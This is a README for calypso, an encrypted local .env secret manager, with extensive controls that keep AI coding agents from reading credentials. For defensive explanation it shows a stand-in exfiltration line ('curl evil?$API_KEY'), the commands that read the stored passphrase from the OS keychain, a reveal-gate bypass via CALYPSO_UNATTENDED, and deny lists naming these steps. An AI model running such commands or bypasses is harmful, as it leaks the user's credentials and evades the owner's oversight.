# calypso

A local, encrypted manager for your projects' `.env` files. One vault holds
every project's environment. Secrets leave the machine only through an
explicit platform sync or owner-configured trusted operation.

## Install

Requires **Go 1.26+**.

```bash
git clone https://github.com/yemon/calypso.git
cd calypso
go install ./cmd/calypso

# Add to your shell config (.zshrc / .bashrc):
export PATH="$HOME/go/bin:$PATH"
```

Verify:

```bash
calypso version
# calypso 1.0.6
#   commit: abc1234
#   go:     go1.26.3
```

## Getting Started (step by step)

### 1. Register your first project

No `init` needed — the vault is created on first use.

```bash
calypso add myapp --path ~/projects/myapp/.env
```

You'll be prompted to create a master passphrase. This is the **only key**
you'll ever need — guard it carefully, it cannot be recovered.

### 2. Import your existing `.env`

If you already have a `.env` file with secrets:

```bash
calypso push myapp
```

This shows a diff summary before overwriting:

```
Changes in "myapp":
  +3 added  ~0 changed  -0 removed  =0 unchanged

Overwrite vault values with .env? [y/N]: y
```

Skip the prompt with `--force`:

```bash
calypso push myapp --force
```

### 3. Add more variables

```bash
calypso set myapp OPENAI_API_KEY=sk-abc123 GEMINI_API_KEY=ai-xyz789
```

### 4. View your vault

```bash
calypso list                          # overview of all projects
calypso get myapp                     # masked values (safe to share)
calypso get myapp --reveal            # real values (be careful)
```

### 5. Write values to `.env`

```bash
calypso pull myapp                    # write real values
```

## Production agent isolation

Use **agent strict mode** when a coding agent must be able to test a real
credential-backed service without learning either the credential name or
value. Strict mode does not inject secrets into agent-controlled code.

First, as the owner and outside the agent session, configure a fixed
operation:

```bash
calypso operation add-http "staging health" myapp@staging \
  --url https://staging.example.com/health \
  --key SERVICE_TOKEN \
  --header Authorization \
  --prefix "Bearer " \
  --expect 200-299
# Added trusted operation op_<opaque-id> (staging health).
```

The URL, method, credential binding, header, status range and timeout are
fixed inside the encrypted vault. Runtime callers cannot replace them or
provide arbitrary arguments.

Enable the boundary:

```bash
calypso strict on
calypso strict status
```

Enabling strict mode also enables hard lockdown and replaces every readable,
registered `.env` with a name-free sentinel. Activation refuses if a
registered file contains unsynced local edits. While strict mode is on,
owner and compatibility commands—including all forms of `pull`, `get`,
mutation, import/export, sync and dashboard—are blocked. Turning it off
requires entering the master passphrase at a real terminal:

```bash
calypso strict off
```

For production separation, start the broker under an OS identity that can
unlock the vault but is not the coding-agent identity:

```bash
calypso broker serve \
  --connection-file /run/calypso/myapp-broker.json \
  --connection-mode 0640 \
  --allow op_<opaque-id>
```

Use a dedicated shared group for the broker and agent accounts when selecting
`0640`; the default is owner-only `0600`. The capability authorizes only the
fixed operations exposed by that broker and contains no vault credential.

Give the agent only the generated broker capability file and the opaque
operation ID. The agent needs neither the vault, passphrase nor keychain:

```bash
calypso broker invoke op_<opaque-id> \
  --connection-file /run/calypso/myapp-broker.json
# Operation op_<opaque-id> succeeded (HTTP 204, 183 ms).
```

Each broker must explicitly allow at least one operation ID; its capability
cannot invoke other vault operations. The broker binds only to an explicit
loopback IP, authenticates with a random capability token, disables redirects
and environment proxies, bounds time and response handling, discards upstream
headers and bodies, and returns only the opaque ID, success/failure, status
and duration. A killed broker may leave a stale capability file, but no
plaintext credential or credential-bearing `.env`; the capability becomes
unusable when the broker exits.

`calypso operation run <id>` provides the same bounded request directly for
owner/CI diagnostics. Agents should use `broker invoke` so the vault remains
outside their OS security domain.

## Compatibility LLM safety

The workflows below prevent common accidental transcript leaks, but they are
not isolation from an agent that controls the executed command. Use agent
strict mode and the broker for that threat model.

Prevent AI coding assistants from reading your secrets:

### Before sharing code with an LLM

```bash
calypso pull myapp --safe
```

Your `.env` becomes:

```
# Managed by calypso. Safe mode — values are masked.
DB_HOST=****
API_KEY=****
DATABASE_URL=****
```

The LLM can see **what keys exist** but never the actual values.

### After the LLM session

```bash
calypso pull myapp                    # restore real .env
```

### One-shot: run a command safely

Write real `.env`, execute a command, automatically shred when done:

```bash
calypso pull myapp -- npm test --verbose
# 1. Writes real .env
# 2. Runs `npm test --verbose`
# 3. Overwrites .env with **** (always, even on failure)
```

The command's output is **scrubbed**: any secret value that appears in
stdout/stderr is replaced with the name-free `<concealed>` marker, so `pull myapp -- env`
or an error message that echoes a connection string can't leak values
into an agent transcript. Scrubbing pipes the child's output (colors and
progress bars degrade). The unsafe `--no-scrub` option requires a human
terminal and is blocked by lockdown and agent strict mode.

Prefer the disk never seeing plaintext at all? `--inject` skips the
`.env` write entirely and passes values via the child's process
environment only:

```bash
calypso pull myapp --inject -- npm test
# .env untouched; $API_KEY etc. exist only inside the child process
```

### The reveal gate

Commands that print or write real values — `get --reveal`,
`diff --reveal`, `drift --reveal`, plain `pull`, `export`,
`vault export-project` — require an **interactive terminal**. Headless
processes (AI agents, scripts) get:

```
error: get --reveal reveals real values and needs an interactive terminal;
set CALYPSO_UNATTENDED=1 to allow unattended use (CI)
```

CI pipelines that legitimately need real values set `CALYPSO_UNATTENDED=1`
once. Don't give that variable to your coding agent.

### Exposure check — don't leave real values on disk

The easiest leak has nothing to do with calypso commands: a plain
`pull` for local debugging, then you forget to restore, and the real
`.env` sits there for anything to read. `exposure` catches it:

```bash
calypso exposure
```

```
myapp@dev  (/home/you/projects/myapp/.env)
  2 real value(s) on disk for 3h12m: API_KEY, DATABASE_URL
  fix: calypso pull myapp@dev --safe
```

A key counts as exposed ("hot") when its on-disk value matches the
vault's real value — masked, empty, rotated, and tiny values never
false-positive. Exit code is non-zero when anything has been hot for
at least `--max-age` (default 30m), so it works as a cron guard:

```bash
*/15 * * * * calypso exposure --max-age 30m || notify-send "calypso: .env exposed"
```

`--fix` rewrites hot files with masked values on the spot. If the file
also holds local edits the vault doesn't know yet, the fix is refused
(push first, or `--force`).

### Agent config generator

Write secret-safety rules straight into your coding agent's own config:

```bash
calypso agent init claude-code     # .claude/settings.json deny/allow rules
calypso agent init opencode        # opencode.json permission.bash deny globs
calypso agent init codex           # AGENTS.md policy + config.toml snippet
calypso agent init claude-code --global --dry-run
```

What each gets:

- **claude-code** — denies inline `CALYPSO_UNATTENDED=...` prefixes (the
  one bypass of the reveal gate), `calypso export`, `calypso lockdown
  off`, and direct keychain reads (`secret-tool`, `security
  find-generic-password`); allowlists the masked commands so they stop
  prompting.
- **opencode** — same set as deny globs, plus `calypso*--reveal*`
  (opencode globs can match mid-command, so `--reveal` is deniable
  there).
- **codex** — Codex has no per-command deny, so an advisory policy
  section is written into `AGENTS.md` (idempotent, marker-delimited) and
  a `shell_environment_policy` exclude snippet is printed for
  `~/.codex/config.toml`.

Existing settings are merged, never clobbered; run it again anytime —
it's idempotent. Agent strict mode is the in-binary boundary; running the
broker under a separate OS identity keeps the vault and keychain outside
the agent boundary.

### Lockdown mode

For a hard stop, store the block inside the encrypted vault itself:

```bash
calypso lockdown on        # reveal-class commands now refuse entirely
calypso lockdown status
```

While on, reveal-class commands fail even on a TTY and even with
`CALYPSO_UNATTENDED=1`. The agent workflow keeps working: `list`, masked
`get`, `pull --safe`, `pull -- cmd` (scrubbed), `drift`, `gaps`.

Turning it off requires typing the master passphrase at an interactive
terminal — the keychain and `CALYPSO_PASSPHRASE` are deliberately
ignored, so an unattended agent cannot flip it back:

```bash
calypso lockdown off
# Master passphrase: ************
```

**Deploy pipelines:** vault-wide lockdown would also block a CI job's
plain `pull`. For vault copies that feed a deployment, use:

```bash
calypso lockdown on --allow-unattended
```

Contexts that explicitly set `CALYPSO_UNATTENDED=1` (your CI) stay
exempt; everything else — including a headless coding agent — stays
blocked. Tradeoff: any process willing to set that variable gets
through, so keep the hard default on the vault your agent can reach,
and let `calypso agent init` deny `CALYPSO_UNATTENDED=` prefixes at the
tool layer. For agent-driven production work, use strict broker operations.
Reserve `pull --inject` for trusted CI commands that are not agent-controlled.

## Multiple Environments (staging / dev / production)

Each project can have multiple environments, each with its own `.env` file.
Use `name@env` to target a specific one, or bare `name` when there's only one.

### Setup

```bash
# Create a project with a dev environment
calypso add myapp --env dev --path .env.dev

# Add a production environment to the same project
calypso add myapp@prod --path .env.production

# Add staging by cloning from dev
calypso env copy myapp@dev staging --path .env.staging
```

### Day-to-day

```bash
calypso set myapp@dev API_KEY=sk-test
calypso set myapp@prod API_KEY=sk-live STRIPE_KEY=sk_live_abc
calypso push myapp@staging --force

# Pull per environment
calypso pull myapp@dev --safe       # mask before LLM sessions
calypso pull myapp@staging          # write real values
```

### View environments

```bash
calypso env list myapp
```

```
ENV      VARS  UPDATED               PATH
dev      3     2026-05-23T10:00:00Z  .env.dev
prod     5     2026-05-23T10:01:00Z  .env.production
staging  3     2026-05-23T10:02:00Z  .env.staging
```

### Compare environments of the same project

```bash
calypso diff myapp@dev myapp@prod --reveal
```

```
KEY        myapp@dev    myapp@prod    STATUS
API_KEY    sk-test      sk-live       differs
STRIPE_KEY —            sk_live_abc   only in myapp@prod
```

### How it works

- Without `@env`, a project has one environment named `"default"` (invisible).
- Adding a second env enables the `name@env` syntax — bare `name` then returns
  a clear error listing available envs.
- `env copy` deep-copies all variables from one env to another.
- Every command that takes a project name supports `name@env`: `set`, `get`,
  `unset`, `push`, `pull`, `diff`, `remove`.

## Keychain (no more typing passphrases)

The OS keychain stores **the master passphrase** (not the env values)
so calypso can unlock the vault transparently on every command. After a
one-time setup, you stop typing the passphrase entirely.

### One-time setup

```bash
calypso keychain save
# Master passphrase: ************
# Passphrase stored in keychain.
```

That's it. From then on:

```bash
calypso get myapp@dev API_KEY     # no prompt
calypso pull myapp@prod            # no prompt
calypso set myapp@dev FOO=bar      # no prompt
```

Under the hood, every command's `openVault` tries the keychain first.
If it returns a working passphrase, the vault opens silently. If the
stored passphrase is wrong (you rotated it manually), calypso forgets
the keychain entry automatically and falls back to prompting.

### What's stored where

| Thing                  | Where                           | Protected by                 |
|------------------------|---------------------------------|------------------------------|
| Master passphrase      | OS keychain                     | OS-level user authentication |
| Env values             | `~/.calypso/vault.enc`          | Argon2id + NaCl secretbox    |
| Auto-backups           | `~/.calypso/vault.enc.backups/` | Same crypto as the vault     |

The vault file itself is **always** encrypted on disk. The keychain
just removes the typing step at unlock time — it does not lower the
encryption strength of your data at rest.

### Platform backends

| Platform | Backend                  | Install                                          |
|----------|--------------------------|--------------------------------------------------|
| macOS    | Keychain (`security`)    | Built-in                                         |
| Linux    | libsecret (`secret-tool`)| `apt install libsecret-tools` (or distro equiv.) |
| Windows  | not yet supported        | use `CALYPSO_PASSPHRASE` env var instead          |

Check what calypso sees:

```bash
calypso keychain status
# Keychain backend: available, passphrase is stored
```

If you see "not available" on Linux, install `libsecret-tools`.

### Removing it

```bash
calypso keychain forget
# Passphrase removed from keychain.
```

Calypso goes back to prompting on every command. Use this before
walking away from a shared machine, or before handing off ownership of
your workstation.

### Rotating the passphrase

```bash
calypso vault rekey
# Master passphrase: ************        (current — keychain/env also work)
# New master passphrase: ************
# Confirm new passphrase: ************
```

Unattended rotation in CI:

```bash
CALYPSO_UNATTENDED=1 CALYPSO_NEW_PASSPHRASE="new-pass" calypso vault rekey
```

After a rekey:

- the old-passphrase blob is kept at `<vault>.pre-rekey.bak` — verify
  access, then delete it
- **existing auto-backups and exports still need the OLD passphrase**
- a stored keychain entry is updated automatically (interactive runs only)
- update `CALYPSO_PASSPHRASE` wherever CI/workspaces set it

`rekey` is refused while lockdown is on — a process that merely knows
the old passphrase must not be able to rotate the vault away from you.

### For AI coding agents (Cursor, Claude Code, Codex, Cline, …)

The production recommendation is the strict broker workflow above: do not
give the coding-agent OS identity the vault passphrase or keychain. The
keychain workflow in this section is compatibility mode for trusted agents
where accidental output disclosure—not hostile or arbitrary code—is the
threat model.

If you have an AI agent driving a terminal — Cursor's terminal, Claude
Code, Codex CLI, Cline, Aider, or anything else that shells out — a
passphrase prompt **will block the agent**. The agent can't see the
hidden password field, can't type into it, and the command hangs
forever (or fails immediately with `inappropriate ioctl for device`
when there's no TTY). The agent is then stuck and your turn dies.

The keychain fixes this. Do this *once* in your own terminal (not in
the agent's):

```bash
calypso keychain save
# Master passphrase: ************
# Passphrase stored in keychain.
```

From then on, a trusted compatibility-mode agent can run Calypso without
prompting:

```bash
# Agent terminal — these all succeed without any prompt
calypso list
calypso get myapp@dev DB_HOST              # masked: lo***st
calypso pull myapp@dev                     # writes real values to .env
calypso pull myapp@dev -- npm test         # runs your tests with real values
calypso drift myapp@dev                    # alerts if .env was hand-edited
```

#### Remote/cloud dev environments

If the agent is running in a place where the OS keychain isn't
available — Codespaces, Gitpod, Coder, a remote ssh box, a cloud agent
that spins up containers — `keychain save` will fail or be useless.
Use `CALYPSO_PASSPHRASE` instead. Set it as a workspace secret (NOT in
a tracked file):

```bash
# Set ONCE in your workspace's env-config UI:
export CALYPSO_PASSPHRASE="your-master-passphrase"

# Then the agent runs the same commands as above, prompt-free:
calypso pull myapp@dev -- npm test
```

GitHub Codespaces: add it under *Settings → Codespaces → Secrets*.
Gitpod: under *Variables*. Most cloud agents have an equivalent
"environment" or "secrets" panel — they get injected into every shell
the agent opens, so no prompt is ever needed.

#### What can a compatibility-mode agent see?

Once the agent can unlock the vault (via keychain or
`CALYPSO_PASSPHRASE`), here is what each command gives a **headless**
process (no TTY, no `CALYPSO_UNATTENDED`):

| Command                          | What the agent sees                                 |
|----------------------------------|-----------------------------------------------------|
| `calypso get myapp KEY`          | Masked, fixed-width (`********`)                     |
| `calypso get myapp KEY --hint`   | Masked with edge hint (`sk****23`)                  |
| `calypso get myapp KEY --reveal` | **Refused** (reveal gate: no TTY)                   |
| `calypso pull myapp`             | **Refused** (reveal gate: no TTY)                   |
| `calypso pull myapp --safe`      | Writes `****` placeholders                          |
| `calypso pull myapp -- cmd…`     | Real values during `cmd`; literal output scrubbed to `<concealed>`; `.env` wiped to `****` after |
| `calypso pull myapp --inject -- cmd…` | Same, but `.env` never touched — env-only injection |
| `calypso export` / `export-project`   | **Refused** (reveal gate: no TTY)             |

Three in-binary layers keep it that way, strongest last:

1. **Reveal gate** — reveal-class commands need a TTY or
   `CALYPSO_UNATTENDED=1`. Headless agents hit a hard error.
2. **Output scrubbing** — `pull -- cmd` filters literal secret values from
   stdout/stderr with a name-free `<concealed>` marker.
3. **Lockdown** (`calypso lockdown on`) — the block lives inside the
   encrypted vault; reveal-class commands refuse regardless of TTY or
   env vars, and only an interactive passphrase entry lifts it.

Belt-and-braces additions at the tool layer still help in compatibility mode:

- **Cursor / Claude Code / Cline**: allowlist `calypso list`,
  `calypso get` (without `--reveal`), `calypso pull -- cmd…`,
  `calypso drift`; deny `calypso get --reveal`, plain `calypso pull`,
  `calypso export`, and anything setting `CALYPSO_UNATTENDED`.
- **Prompt convention**: never use compatibility secret execution for an
  untrusted agent; enable strict mode and invoke only broker capabilities.

**Compatibility limit:** an agent allowed to run *arbitrary* commands with
real values injected can still exfiltrate them from inside the child
process (`pull myapp -- sh -c 'curl evil?$API_KEY'`). Scrubbing hides
literal values from the transcript, not from the command itself. Agent strict
mode closes this path by rejecting all arbitrary secret-bearing commands;
trusted broker operations keep the credential outside agent-controlled code.

### How it interacts with `CALYPSO_PASSPHRASE`

If `CALYPSO_PASSPHRASE` is set, calypso uses it and **skips the keychain
entirely** — handy for CI scripts that shouldn't touch the user's
keychain, and for `keychain save` itself (it stores whatever
`CALYPSO_PASSPHRASE` provides without re-prompting).

> **Deprecation:** this variable used to be named `ENVHUB_PASSPHRASE`. The
> old name is still honored for backward compatibility but prints a warning
> on use — rename it to `CALYPSO_PASSPHRASE`.

### Security tradeoffs (read before turning it on)

The keychain is convenient because it removes a friction step. It also
moves the security boundary, so know what you're trading.

**What the keychain gives you**
- The vault file stays encrypted with the same Argon2id + secretbox
  scheme. Stealing `vault.enc` alone is still useless without the
  passphrase.
- The passphrase lives in a per-user OS-managed credential store, not
  in a config file, env var, or your shell history.
- macOS Keychain and libsecret both gate access with the OS user
  session. A locked screen means a locked passphrase.

**What it gives up**
- *Any* process running as your user can read the passphrase. On
  Linux: `secret-tool lookup app calypso`. On macOS:
  `security find-generic-password -a calypso -w`. That includes
  shell scripts you ran, malware that compromised your account, and
  the LLM coding agent in your editor. The passphrase is no longer
  the security boundary — your user account is.
- Backups taken with `calypso vault backups` or `calypso export` will
  decrypt with the keychain-cached passphrase. Anyone with both your
  user account and your vault file gets your secrets.

**When to use it**
- ✅ Your personal laptop, where you trust everything running as you.
- ✅ A workstation where you accept that compromise-of-user equals
  compromise-of-secrets (which is usually true regardless).
- ❌ Shared machines (multiple humans logging in as the same user).
- ❌ CI runners and remote agents — use `CALYPSO_PASSPHRASE` for the
  duration of the job instead.
- ❌ Machines where you run untrusted code as your user (e.g. a
  freshly cloned repo with build scripts you haven't audited).

## Audit log

Every reveal-class gate decision — permitted **or denied** — and every
control operation (lockdown, rekey, sync) appends a record to
`<vault>.audit.log`:

```bash
calypso audit list
```

```
TIME                  OP          SPEC       KEYS  OUTCOME  USER   PARENT  UNATTENDED
2026-08-02T10:12:03Z  get-reveal  myapp@dev  3     denied   you    node    false
2026-08-02T10:14:41Z  pull        myapp@dev  3     ok       you    zsh     false
2026-08-02T10:20:09Z  sync-fly    myapp@prod 5     ok       you    bash    true
```

Records hold metadata only — never values or passphrases. A denied
`--reveal` from an agent leaves a trace: the `PARENT` column shows what
invoked calypso (`node`, `zsh`, a CI runner).

Lines form a SHA-256 hash chain; editing or deleting any line breaks it:

```bash
calypso audit verify
# Audit chain OK: 42 event(s) verified.
```

The log is plaintext (readable without unlocking the vault) and
best-effort: a failed write warns but never blocks your command. Set
`CALYPSO_AUDIT=0` to disable. It is evidence against accidents and
honest processes — an attacker with write access to your files can
truncate it (they could also read your keychain; same boundary).

## Platform sync (deploy)

Push an env's values straight into a platform's secret store — replaces
the `get --reveal | ...` shell-pipe dance:

```bash
calypso sync fly myapp@prod --app myapp-prod     # flyctl secrets import
calypso sync vercel myapp@prod --target production
calypso sync k8s myapp@prod --namespace prod     # kubectl apply Secret
calypso sync k8s myapp@prod --dry-run            # masked preview, no CLI needed
```

Mechanics: values travel to the platform CLI via **stdin** (never argv,
never a temp file); k8s gets an in-memory `v1 Secret` manifest with
base64 data piped to `kubectl apply -f -` (upserts on re-run); vercel
upserts per key with `env add --force`. The platform CLI's output is
scrubbed, so a CLI that echoes a value prints `<concealed>`.

`sync` is reveal-class: gated by TTY/`CALYPSO_UNATTENDED=1`, blocked by
hard lockdown, exempt under `lockdown on --allow-unattended` (fitting —
sync usually runs in CI), and every run is audited.

Fly note: `secrets import` uses `KEY=VALUE` lines, which can't carry
multiline values — such keys are rejected by name. Kubernetes carries
anything via base64.

## Backup & Transfer

### Auto-backup (built in, on by default)

Every successful save also writes a timestamped copy to
`<vault>.backups/<UTC-ns-timestamp>.enc`. No setup needed — the backups
appear from your first `add` onwards.

```bash
calypso vault backups list
```

```
NAME                                AGE
20260524T091500.000000000Z.enc      2h ago
20260524T091723.451200000Z.enc      2h ago
20260524T112048.998700000Z.enc      14m ago
```

Roll back to any of them:

```bash
calypso vault backups restore 20260524T091500.000000000Z.enc
# → restores that backup, snapshots the current vault to
#   <vault>.pre-restore.bak so the restore is itself undoable
```

Tune retention (default 10; `0` disables auto-backup entirely):

```bash
export CALYPSO_BACKUP_RETAIN=30      # keep last 30 saves
export CALYPSO_BACKUP_RETAIN=0       # disable
```

Backups are byte-identical to the vault file (same encryption, same
passphrase). Restoring is a file copy, not a re-encrypt.

### Export the whole vault

```bash
calypso export ~/backup/vault.enc        # raw encrypted blob
calypso export --base64 > vault.txt      # base64 for git notes / password managers
```

The exported file is **still encrypted** — you need the master passphrase to use it.

### Export one project (or one env)

For sharing a single project's setup with a teammate, or a targeted
backup of just the env you care about:

```bash
calypso vault export-project myapp /share/myapp.cbk          # all envs
calypso vault export-project myapp@prod /share/myapp-prod.cbk # just prod
```

The output blob uses the same encryption as a full vault export — the
recipient needs the master passphrase to import.

### Import on another machine

```bash
calypso import ~/backup/vault.enc                # full-vault restore (default)
calypso import --base64 vault.txt                # same, from base64

calypso import /share/myapp.cbk --merge          # partial export → merge into current vault
calypso import /share/myapp.cbk --merge --force  # also replace an existing project of the same name
```

Default `import` blind-copies the encrypted blob over the current vault
file — no passphrase needed at import time. The `--merge` flag opts into
the partial-export path: decrypts the blob (prompts for the master
passphrase), confirms it's a `vault export-project` output, and merges
just the project into your existing vault.

## Vault health

### Verify

`calypso vault verify` is a read-only health check — useful in cron or
as a pre-deploy guard.

```bash
calypso vault verify
```

```
Findings:
  [WARNING] myapp@dev: Path "relative/.env" is relative [fixable]
  [WARNING] myapp: UpdatedAt is empty [fixable]
```

Exit code is non-zero if any **error**-severity issue is found
(warnings alone don't fail). Add `--fix` to apply the trivial repairs
(sync names, fill timestamps, normalise relative paths) and save:

```bash
calypso vault verify --fix
```

```
Findings:
  [WARNING] myapp@dev: Path "relative/.env" is relative [fixable]

Applied:
  - myapp@dev: normalised Path (was "relative/.env")
  - myapp: set UpdatedAt

No issues remain.
```

The pre-fix vault is preserved by the regular auto-backup.

### Detect `.env` drift

When someone (or some other tool) edits `.env` directly without going
through calypso, the vault and disk diverge. `calypso drift` shows it.

```bash
calypso drift              # scan every env
calypso drift myapp@prod   # one env
```

```
myapp@prod  (/srv/myapp/.env.production)
  +1 added  ~1 changed  -0 removed  =4 unchanged

myapp@staging  (/srv/myapp/.env.staging)
  +0 added  ~0 changed  -0 removed  =5 unchanged
```

Use `--details` to see which keys changed, and `--reveal` to see the
actual values:

```bash
calypso drift myapp@prod --details --reveal
```

```
myapp@prod  (/srv/myapp/.env.production)
  +1 added  ~1 changed  -0 removed  =4 unchanged
  KEY        VAULT             DISK             KIND
  API_KEY    sk-vault-value    sk-edited-value  changed
  HOTFIX     —                 enabled          only on disk
```

Exit code is non-zero on any drift, so this works as a CI guard:

```bash
calypso drift || { echo ".env drifted from vault — investigate"; exit 1; }
```

## Shell Completion

```bash
# bash
calypso completion bash > ~/.bash_completion

# zsh
calypso completion zsh > ~/.zfunc/_calypso

# fish
calypso completion fish > ~/.config/fish/completions/calypso.fish
```

## CI / Scripts

Set the `CALYPSO_PASSPHRASE` environment variable for non-interactive use.
Reveal-class commands (plain `pull`, `get --reveal`, `export`) additionally
need `CALYPSO_UNATTENDED=1` when there is no terminal — that's the reveal
gate that keeps headless AI agents from printing real values:

```bash
export CALYPSO_PASSPHRASE="my-master-passphrase"
export CALYPSO_UNATTENDED=1
calypso set myapp CI_TOKEN=ghp_123
calypso pull myapp
```

## `.env.example` generation

Create a template for documentation or git:

```bash
calypso pull myapp --example
# .env becomes:
#   DB_HOST=
#   API_KEY=
#   DATABASE_URL=
```

Commit this as `.env.example` so contributors know what keys are needed.

## Multi-Project Management

### Compare two projects

```bash
calypso diff staging production --reveal
```

Output:

```
KEY        staging           production        STATUS
API_KEY    sk-staging-key    sk-prod-key       differs
DB_HOST    db.staging.com    db.prod.com       differs
DEBUG      1                 —                 only in staging
LOG_LEVEL  —                 warn              only in production
```

### Find missing keys across all projects

```bash
calypso gaps
```

Flags projects that are missing a key their siblings define — common source of
"works on my machine" bugs.

### Dashboard

```bash
calypso dashboard --port 7777
# → http://127.0.0.1:7777
```

Read-only web overview: project list, gap matrix, key usage table.
Values are **never shown**.

## Complete Command Reference

### Project management

```bash
calypso add <name> --path <path>           # register a project
calypso add <name> --env <env> --path <p>  # register with named env
calypso add <name@env> --path <p>          # add an env to existing project
calypso remove <name[@env]>                # remove project or single env
calypso list                               # table of all projects + envs
```

### Environment management

```bash
calypso env list <project>                 # list environments in a project
calypso env copy <src@env> <dst> --path <p> # clone an env's vars into a new one
```

### Variables

```bash
calypso set <name[@env]> KEY=value...      # add or update
calypso get <name[@env]> [KEY]             # view (masked by default)
calypso get <name[@env]> --reveal          # view real values
calypso unset <name[@env]> KEY...          # remove variables
```

### Sync

```bash
calypso push <name[@env]>                  # import .env → vault (confirms changes)
calypso push <name[@env]> --force          # skip confirmation
calypso pull <name[@env]>                  # export vault → .env (real values; reveal-gated)
calypso pull <name[@env]> --safe           # masked values (****) for LLM safety
calypso pull <name[@env]> --example        # empty values for .env.example
calypso pull <name[@env]> -- command...    # write, run command (output scrubbed), shred
calypso pull <name[@env]> --inject -- cmd  # env-only injection, .env never written
calypso pull <name[@env]> --no-scrub -- c  # unsafe: human TTY only; blocked by lockdown/strict
```

### Analysis

```bash
calypso diff <A[@env]> <B[@env]>             # compare two projects or envs
calypso diff <A[@env]> <B[@env]> --reveal     # with real values
calypso gaps                                 # find missing keys across all
calypso drift [project[@env]]                # compare vault vs on-disk .env
calypso drift [project[@env]] --details      # per-key listing
calypso drift [project[@env]] --reveal       # show real values in --details
calypso exposure [project[@env]]             # warn when real values sit on disk
calypso exposure --max-age 30m               # non-zero exit when hot that long (cron guard)
calypso exposure --fix [--force]             # rewrite hot .env files with **** values
calypso dashboard --port <N>                 # web overview
```

### Agent integration

```bash
calypso agent init claude-code [--global]    # deny/allow rules → .claude/settings.json
calypso agent init opencode [--global]       # deny globs → opencode.json
calypso agent init codex                     # policy section → AGENTS.md (+ toml snippet)
calypso agent init <tool> --dry-run          # preview without writing
```

### Agent strict mode and trusted operations

```bash
calypso operation add-http <label> <spec> --url <https-url> --key <KEY>
calypso operation list                       # strict: opaque IDs only; owner mode also shows labels
calypso operation run <operation-id>         # bounded owner/CI diagnostic
calypso operation remove <operation-id>      # owner operation; blocked when strict

calypso strict on                            # broker-only boundary + hard lockdown
calypso strict status
calypso strict off                           # interactive passphrase required

calypso broker serve --connection-file <path> --allow <operation-id>
calypso broker invoke <operation-id> --connection-file <path>
```

### Audit

```bash
calypso audit list [--limit N]               # recent secret-touching operations
calypso audit verify                         # check the hash chain for tampering
```

### Platform sync

```bash
calypso sync fly <spec> [--app A]            # flyctl secrets import (stdin)
calypso sync vercel <spec> [--target T]      # vercel env add --force, per key
calypso sync k8s <spec> [--name N] [-n NS]   # kubectl apply of a Secret manifest
calypso sync <platform> <spec> --dry-run     # masked preview
```

### Vault management

```bash
calypso init                                 # manual vault creation (optional)

calypso keychain save                        # store passphrase in OS keychain
calypso keychain forget                      # remove from keychain
calypso keychain status                      # check keychain status

calypso lockdown on                          # block reveal-class commands (agent safety)
calypso lockdown on --allow-unattended       # same, but CALYPSO_UNATTENDED=1 pipelines exempt
calypso lockdown off                         # lift it (interactive passphrase required)
calypso lockdown status                      # show lockdown state

calypso vault rekey                          # change the master passphrase (re-encrypts)

calypso export <path>                        # full-vault backup to file
calypso export --base64                      # full-vault backup to stdout (base64)
calypso import <path>                        # restore full vault (no passphrase needed)
calypso import --base64 <path>               # restore from base64
calypso import <path> --merge [--force]      # merge a partial export into current vault

calypso vault verify                         # sanity-check (read-only)
calypso vault verify --fix                   # apply trivial repairs and save
calypso vault downgrade                      # rewrite as legacy v1 (single-env only)

calypso vault backups list                   # show auto-backups
calypso vault backups restore <name>         # roll back to a backup
calypso vault export-project <spec> <path>   # export one project or env
```

### Other

```bash
calypso completion <shell>           # generate shell completion
calypso version                      # print version info
```

## Security

### Encryption

- **Argon2id** (64 MB, 3 iter, 4 threads) → GPU/ASIC resistant key derivation
- **NaCl secretbox** (XSalsa20-Poly1305) → authenticated encryption
- Fresh **salt + nonce** per save → no key reuse

### File safety

- Vault: `0600` perms, `.env` files: `0600` perms
- Atomic writes (`.tmp` → `rename`) → never partial, crash-safe
- `flock(2)` advisory locking → no two processes can write simultaneously

### Passphrase handling

- Read **without echo** (terminal raw mode)
- **SIGINT safe** — Ctrl+C during entry restores terminal state
- **Zeroed in memory** after every operation
- 3 **retry attempts** with increasing delay (500ms → 1s → 1.5s)
- Supports `CALYPSO_PASSPHRASE` for CI

### Defaults

- `get` and `diff` **mask** values (first 2 + last 2 chars)
- `--reveal` required to see real values, and only works at an
  interactive terminal (or with `CALYPSO_UNATTENDED=1` for CI)
- `calypso lockdown on` disables reveal-class commands entirely until
  the passphrase is typed at a terminal
- `calypso strict on` blocks credential names, arbitrary secret-bearing
  execution and owner mutation; registered `.env` files become name-free
  sentinels
- `pull -- cmd` scrubs secret values from the command's output
  (`<concealed>`)
- production agents invoke only fixed broker capabilities, with the broker
  and vault held under a separate OS identity
- Dashboard binds `127.0.0.1`, shows **no values**

## `.env` Parsing

- `KEY=value` — basic assignment
- `export KEY=value` — export prefix stripped
- `"double"` / `'single'` quoted values — quotes removed
- Multiline quoted values
- Escape sequences: `\n`, `\t`, `\"`, `\\`
- `# comments` and blank lines ignored
- `=` inside values handled correctly

## Architecture

```
cmd/calypso/           CLI (Cobra), 20+ commands
internal/
  crypto/              Argon2id + NaCl secretbox
  vault/               Encrypted vault + envs + strict-operation policy
  operation/           Fixed HTTP credential broker executor
  project/             .env parse (multiline), types, serialize
  analysis/            Diff, gaps, key matrix
  dashboard/           Web UI (go:embed template)
  lockfile/            Advisory flock(2) locking
  keychain/            macOS Keychain / Linux libsecret
```

## Development

```bash
make build          # build binary with version info
make test           # run unit tests
make test-int       # run integration tests (CLI lifecycle)
make lint           # run golangci-lint
make vet            # run go vet
make all            # lint → vet → test → build
make install        # install to $GOPATH/bin
make clean          # remove binary + test cache
```
